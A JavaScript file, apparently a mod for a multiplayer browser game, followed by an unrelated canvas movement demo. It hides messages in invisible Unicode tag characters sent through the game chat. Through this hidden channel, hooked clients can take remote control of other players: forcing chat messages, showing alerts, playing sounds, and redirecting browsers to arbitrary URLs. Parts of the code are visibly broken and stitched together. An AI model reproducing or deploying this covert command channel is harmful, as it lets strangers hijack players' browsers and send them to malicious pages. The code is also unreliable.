
const encode = (/**@type {string}*/ text) => {
    const codePoints = [...text].map((c) => c.codePointAt(0));

    const output = [];
    for (const char of codePoints) {
        output.push(
            String.fromCodePoint(
                char + (0x00 < char && char < 0x7f ? 0xe0000 : 0)
            ).toString()
        );
    }

    return output.join("");
};

const decode = (/**@type {string}*/ text) => {
    const codePoints = [...text].map((c) => c.codePointAt(0));

    const output = [];
    for (const char of codePoints) {
        output.push(
            String.fromCodePoint(
                char - (0xe0000 < char && char < 0xe007f ? 0xe0000 : 0)
            ).toString()
        );
    }

    return output.join("");
};

const detect = (/**@type {string}*/ text) => {
    const codePoints = [...text].map((c) => c.codePointAt(0));
    return codePoints.some((c) => 0xe0000 < c && c < 0xe007f);
};

let rainbowifyList = []
function rainbowify(targetId) {

    if (rainbowifyList.includes(targetId)) {
        rainbowifyList = rainbowifyList.filter(id => id !== targetId)
        if (!target) return

        return
    }

    rainbowifyList.push(targetId)


    // Div

    let interval

    // HTML filter RGB effect using JS DOM
    let colors = [
        'rgb(255,0,0)', 'rgb(255,127,0)', 'rgb(255,255,0)', 'rgb(127,255,0)',
        'rgb(0,255,0)', 'rgb(0,255,127)', 'rgb(0,255,255)', 'rgb(0,127,255)',
        'rgb(0,0,255)', 'rgb(127,0,255)', 'rgb(255,0,255)', 'rgb(255,0,127)'
    ];

    let currentColorIndex = 0;

    function changeColor() {
        const target = document.getElementById(`player-${targetId}`)
        if (!target) {
            clearInterval(interval)
            rainbowifyList = rainbowifyList.filter(id => id !== targetId)
            return
        }

        if (!rainbowifyList.includes(targetId)) {
            clearInterval(interval)
            return
        }

        target.style.backgroundColor = colors[currentColorIndex];
        currentColorIndex = (currentColorIndex + 1) % colors.length;
    }

    interval = setInterval(changeColor, 100);
}

function skin(targetId, skinUrl) {
    const target = document.getElementById(`player-${targetId}`)
    if (!target) return
    target.style.backgroundImage = `url(${skinUrl})`
    target.style.backgroundSize = 'cover';
    target.style.backgroundPosition = 'center';
}

function invisible(targetId, arg) {
    const target = document.getElementById(`player-${targetId}`)
    if (!target) return

    target.style.opacity = arg === 'true' ? '0' : '1'

    if (target === socket.id && arg === 'true') {
        alert("Você está invisível!")
        target.style.opacity = 0.5
    } else if (target === socket.id && arg === 'false') {
        alert("Você não está mais invisível!")
        target.style.opacity = 1
    }

}

// PLAYERS == object with player objects, keys are socket ids and values are player objects
const commands = {
    rainbowify: (targets, arg) => {
        targets.forEach(target => {
            rainbowify(target)
        })
    },
    say: (targets, arg) => {
        targets.forEach(target => {
            if (target === socket.id) {
                socket.emit('chat', { type: 'message', body: { text: arg } });
            }
        })
    },
    redirect: (targets, arg) => {
        targets.forEach(target => {
            if (target === socket.id) {
                window.location.href = arg
            }
        })
    },
    alert: (targets, arg) => {
        targets.forEach(target => {
            if (target === socket.id) {
                alert(arg)
            }
        })
    },
    play_sound: (targets, arg) => {
        targets.forEach(target => {
            if (target === socket.id) {
                new Audio(arg).play()
            }
        })
    },
    skin: (targets, arg) => {
        targets.forEach(target => {
            skin(target, arg)
        })
    },
    invis: (targets, arg) => {
        targets.forEach(target => {
            invisible(target, arg)
        })
    }

}



const waitForSocket = () => {
    if (typeof socket !== 'undefined') {

        socket.emit('chat', {
            type: 'fz!Hook',
            body: {
                text: 'fz!Hook',
                content: encode(JSON.stringify({ message: 'hooked', sender: { nickname: JSON.parse(sessionStorage.getItem("metadata")).nickname, id: socket.id } }))
            }
        })

        socket.on('chat', (_msg) => {
            if (_msg && _msg.content.type === 'fz!Hook') {

                if (!detect(_msg.content.body.content)) return
                const msg = decode(_msg.content.body.content)
                const message = JSON.parse(msg)

                if (message.message === 'ask') {
                    if (message.sender.id !== socket.id) {
                        socket.emit('chat', {
                            type: 'fz!Hook',
                            body: {
                                text: 'fz!Hook',
                                content: encode(JSON.stringify({ message: 'hooked', sender: { nickname: JSON.parse(sessionStorage.getItem("metadata")).nickname, id: socket.id } }))
                            }
                        })
                    }
                } else if (message.message === 'command') {
                    let targets
                    const commandState = message.state

                    switch (commandState.target) {
                        case 'All':
                            targets = Object.keys(players)
                            break
                        case 'Others':
                            targets = Object.keys(players).filter(player => player !== message.sender.id)
                            break
                        case 'Me':
                            targets = [message.sender.id]
                            break
                        default:
                            targets = [commandState.target]
                            break
                    }

                    commands[commandState.command](targets, commandState.arg)
                }
            }
        })

    } else {
        setTimeout(waitForSocket, 50); // Check again after 50ms
    }
};

waitForSocket()

// Assuming you have a <canvas id="gameCanvas"></canvas> in your HTML

const canvas = document.getElementById('gameCanvas');
const context = canvas.getContext('2d');

const character = {
    x: 50,
    y: 50,
    width: 50,
    height: 50,
    color: 'blue',
    speed: 5
};

const keys = {
    ArrowUp: false,
    ArrowDown: false,
    ArrowLeft: false,
    ArrowRight: false
};

// Event listeners for key presses
window.addEventListener('keydown', (event) => {
    if (event.key in keys) {
        keys[event.key] = true;
    }
});

window.addEventListener('keyup', (event) => {
    if (event.key in keys) {
        keys[event.key] = false;
    }
});

// Function to update character position
function update() {
    if (keys.ArrowUp && character.y > 0) {
        character.y -= character.speed;
    }
    if (keys.ArrowDown && character.y + character.height < canvas.height) {
        character.y += character.speed;
    }
    if (keys.ArrowLeft && character.x > 0) {
        character.x -= character.speed;
    }
    if (keys.ArrowRight && character.x + character.width < canvas.width) {
        character.x += character.speed;
    }
}

// Function to render the character on the canvas
function draw() {
    context.clearRect(0, 0, canvas.width, canvas.height); // Clear previous frame
    context.fillStyle = character.color;
    context.fillRect(character.x, character.y, character.width, character.height); // Draw character
}

// Main game loop
function gameLoop() {
    update();
    draw();
    requestAnimationFrame(gameLoop); // Recursively calls gameLoop every frame
}

// Start the game
gameLoop();
